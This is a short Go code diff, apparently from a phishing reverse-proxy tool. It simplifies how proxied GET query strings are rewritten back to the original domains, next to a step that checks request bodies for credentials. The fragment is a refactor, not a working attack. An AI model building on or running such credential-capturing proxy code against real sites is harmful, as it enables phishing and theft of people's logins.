@@ -387,16 +387,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req.Header.Set(string(hg), egg2)
 
 				// patch GET query params with original domains
-				if pl != nil {
-					qs := req.URL.Query()
-					if len(qs) > 0 {
-						for gp := range qs {
-							for i, v := range qs[gp] {
-								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
-							}
-						}
-						req.URL.RawQuery = qs.Encode()
-					}
+				if pl != nil && len(req.URL.RawQuery) > 0 {
+					req.URL.RawQuery = string(p.patchUrls(pl, []byte(req.URL.RawQuery), CONVERT_TO_ORIGINAL_URLS))
 				}
 
 				// check for creds in request body
